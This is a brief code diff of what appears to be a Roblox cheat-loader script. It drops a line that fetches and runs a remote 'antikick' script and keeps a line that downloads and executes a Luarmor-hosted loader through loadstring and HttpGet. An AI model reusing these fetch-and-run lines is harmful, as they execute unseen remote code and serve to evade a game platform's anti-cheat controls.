@@ -1,5 +1,3 @@
 script_key = morte["Key"];
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/IJWIDJNWQF/antikick/refs/heads/main/antikick"))()
-wait(3)
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/050ea47f5125e7830e2643cca46e036d.lua"))()
